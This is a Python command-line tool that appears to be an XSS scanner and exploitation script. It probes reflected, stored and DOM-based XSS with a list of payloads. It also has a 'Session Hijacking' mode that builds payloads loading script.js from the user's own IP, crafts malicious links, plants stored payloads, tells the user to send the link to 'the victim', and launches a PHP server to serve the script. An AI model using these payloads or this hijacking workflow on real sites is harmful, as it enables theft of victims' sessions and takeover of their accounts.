#!/usr/bin/env python3
import requests
import time
from selenium import webdriver
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import urllib.request
import json
import subprocess


dom_payloads = [
    "<img src=x onerror=alert('DOM-XSS-1')>",
    "<iframe onload=alert('DOM-XSS-2')></iframe>"
]

server_payloads = [
    "<script>alert('XSS-1')</script>",
    "<img src=x onerror=alert('XSS-2')>",
    "<h1>Vulnerable</h1>",
    "<svg onmouseover=alert('XSS')>Hover me</svg>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<sCrIpt>alert('XSS')</sCRipt>",
    f"<iframe src='javascript:alert('XSS')'></iframe>",
    "'-alert('XSS')-'"
]

out = {}


def test_server_side_xss(base_url, params_list, mode):
    print(f"\n[*] started SERVER GET test with params: {', '.join(params_list)} на {base_url}\n")

    for param_to_inject in params_list:
        print(f"=========================================\n[*] Testing param: '{param_to_inject}'")
        out[param_to_inject] = []
        for payload in server_payloads:
            print(f"--- Payload: {payload}")
            try:
                if mode == 1:
                    params_dict = {param_to_inject: payload}
                else:
                    params_dict = {p: "test" for p in params_list}
                    params_dict[param_to_inject] = payload

                response = requests.get(base_url, params=params_dict, timeout=10)
                print(f"URL: {response.url}")

                if response.status_code == 200 and payload in response.text:
                    print(f"[+] SUCCESS! Payload found in response (param '{param_to_inject}').\n")
                    out[param_to_inject].append(payload)
                else:
                    print("[-] FAIL. Payload not found or sanitized.\n")
            except requests.exceptions.RequestException as e:
                print(f"[!] Connection error: {e}\n")


def test_dom_xss(base_url, param_name):
    print(f"\n[*] Starting DOM-testing of param '{param_name}' (via #) on {base_url}\n")

    try:
        driver = webdriver.Firefox(service=FirefoxService(GeckoDriverManager().install()))
    except Exception as e:
        print(f"[!] Failed to start WebDriver. Make sure Chrome and ChromeDriver are installed. Error: {e}")
        return

    for payload in dom_payloads:
        print(f"--- Payload: {payload}")

        encoded_payload = urllib.parse.quote(payload)

        target_url = f"{base_url}#{param_name}={encoded_payload}"
        print(f"URL: {target_url}")

        try:
            driver.get(target_url)
            driver.refresh()

            try:
                WebDriverWait(driver, 3).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert_text = alert.text
                print(f"[+] SUCCESS! Found alert: '{alert_text}'\n")
                out[param_name] = payload
                alert.accept()
                continue
            except NoAlertPresentException:
                pass

        except UnexpectedAlertPresentException:
            print("[+] SUCCESS! Unexpected alert found, which indicates a vulnerability.\n")
            try:
                driver.switch_to.alert.accept()
            except NoAlertPresentException:
                pass
        except Exception as e:
            print(f"[!] Error occurred while testing Selenium: {e}\n")

    driver.quit()

def test_post_xss(session, injection_url, view_url, params_list):
    print(f"\n[*] Started SERVER POST test with params: {', '.join(params_list)}\n")
    print(f"    Injection URL (POST): {injection_url}")
    print(f"    Checking URL (GET): {view_url}\n")

    params_dict = {p: "test@test.test" if 'email' in p or 'pass' in p else 'test' for p in params_list}

    for param_to_attack in params_dict.keys():
        if "email" in param_to_attack or "pass" in param_to_attack:
            continue
        else:
            print(f"================ Testing parameter '{param_to_attack}'")
            out[param_to_attack] = []
            for payload in server_payloads:
                print(f"--- Payload: {payload}")

                data_to_send = params_dict.copy()
                data_to_send[param_to_attack] = payload

                try:
                    print(f"[*] Sending POST to {injection_url} and following redirects...")
                    inject_response = session.post(injection_url, data=data_to_send,
                                                   timeout=10)

                    print(f"[+] Server accepted data. Landed on: {inject_response.url}")

                    if payload in inject_response.text:
                        print(f"[+] SUCCESS! Payload found on the redirect destination page.")
                        print("[!] Potential Reflected XSS vulnerability found!\n")
                        out[param_to_attack].append(payload)
                        continue

                    print("[-] Payload not found after redirect. Checking for Stored XSS...")
                    time.sleep(1)

                    print(f"[*] Sending separate GET to {view_url} to check...")
                    view_response = session.get(view_url, timeout=10)

                    if payload in view_response.text:
                        print(f"[+] SUCCESS! Payload found on the view page.")
                        print("[!] Potential Stored XSS vulnerability found!\n")
                        out[param_to_attack].append(payload)
                    else:
                        print("[-] FAIL. Payload not found on the view page either.\n")

                except requests.exceptions.RequestException as e:
                    print(f"[!] Connection error: {e}\n")

def test_session_hijacking(session, base_url, params, vuln_param, mode, ip, port):

    session_hijacking_payloads = [
        f"<script src=http://{ip}:{port}/script.js></script>",
        f"'><script src=http://{ip}/script.js></script>",
        f'"><script src=http://{ip}/script.js></script>',
        f"javascript:eval('var a=document.createElement(\'script\');a.src=\'http://{ip}/script.js\';document.body.appendChild(a)')",
        f'<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{ip}/script.js");a.send();</script>',
        f'<script>$.getScript("http://{ip}/script.js")</script>'
    ]

    params_dict = {p: "test@test.test" if 'email' in p or 'pass' in p else 'test' for p in params}

    if mode == '1': #Reflected
        for payload in session_hijacking_payloads:
            params_dict[vuln_param] = payload

            encoded_params = urllib.parse.urlencode(params_dict)

            # 5. Собираем финальную ссылку
            final_crafted_url = f"{base_url}?{encoded_params}"

            # Выводим результат
            print("--- Payload ---")
            print(payload)
            print("\n--- Crafted link ---")
            print(final_crafted_url)
    elif mode == '2': #stored
        for payload in session_hijacking_payloads:
            print(f"--- Payload: {payload}")

            data_to_send = params_dict.copy()
            data_to_send[param] = payload

            try:
                print(f"[*] Sending POST to {base_url} and following redirects...")
                inject_response = session.post(base_url, data=data_to_send,
                                               timeout=10)

                print(f"[+] Server accepted data. Landed on: {inject_response.url}")

            except requests.exceptions.RequestException as e:
                print(f"[!] Connection error: {e}\n")
            print("[*]Just send link to the vulnerable page to the victim\n")

    HOST = ip
    PORT = port
    DIRECTORY = "."

    print(f"[*] Starting php server on http://{HOST}:{PORT}...")
    time.sleep(1)
    print("[*] Press Ctrl+C to exit...")
    print("-" * 20)

    command = [
        "php",
        "-S",
        f"{HOST}:{PORT}",
        "-t",
        DIRECTORY
    ]

    try:
        subprocess.run(command, check=True)

    except KeyboardInterrupt:
        print("\n" + "-" * 20)
        print("[*] Server stopped by user.")

    except Exception as e:
        print(f"\n[!] Error occured: {e}")


if __name__ == "__main__":
    print("""                                 __ __                   
                              \\/(_ (____ _ _.._ ._  _ ._ 
                              /\\__)__)_>(_(_|| || |(/_|  """)

    mode = input(
        "Select a mode:\n 1 - Server POST test (stored)\n 2 - Server multiple GET parameters ISOLATED test (reflected)\n 3 - Server multiple GET parameters test (e.g. /?par=1&par=2...) (reflected)\n 4 - DOM test (one parameter in a URL fragment, #)\n 5 - Session Hijacking \nYour choice: ")

    base_url = input("Enter the base URL (without the ‘?’ and ‘#’. for POST test, add page in the end. If using Session Hijacking - paste link on vulnerable stored or reflected): ")
    if mode == '1':
        s = requests.Session()

        # --- IF LOGIN NEEDED ---
        # login_url = "http://test-site.com/login.php"
        # login_data = {"username": "my_user", "password": "my_password", "login": "Login"}
        # s.post(login_url, data=login_data)
        # print("[*] Trying to login...")

        params_str = input("Enter the parameter names separated by commas: ")
        params = [p.strip() for p in params_str.split(',')]
        test_post_xss(
            session=s,
            injection_url=base_url,
            view_url=base_url,
            params_list=params
        )
    elif mode == '2':
        params_str = input("Enter the parameter names separated by commas: ")
        params = [p.strip() for p in params_str.split(',')]
        test_server_side_xss(base_url, params, 1)
    elif mode == '3':
        params_str = input("Enter the parameter names separated by commas: ")
        params = [p.strip() for p in params_str.split(',')]
        test_server_side_xss(base_url, params, 2)
    elif mode == '4':
        param = input("Enter the name of the parameter in the URL fragment: ")
        test_dom_xss(base_url, param)
    elif mode == '5':
        print("!!! DONT FORGET TO CHANGE IP IN script.js !!!")
        param = input("Enter the parameter names separated by commas: ")
        vuln_param = input("Enter the vulnerability parameter name: ")
        ip = input("Enter your IP address: ")
        port = input("Enter your port: ")
        mode = input("Select mode:\n 1 - Reflected XSS\n 2 - Stored XSS \n Your choice: ")
        if mode == '2':
            s = requests.Session()
        else:
            s = ""
        test_session_hijacking(s, base_url, param, vuln_param, mode, ip, port)

    else:
        print("\n[!] Invalid mode. Restart the script.")

    if out:
        with open('XSS_vuln_params.json', "w", encoding='utf-8') as f:
            f.write(json.dumps(out))
        for key, value in out.items():
            if value:
                print(f"XSS found in parameter {key} with payloads {'; '.join(map(str, value))}")
        print("[*] Results written to file XSS_vuln_params.json")
    elif mode != '5':
        print("\n[!] No results were found.")

    print("[*] Testing completed.")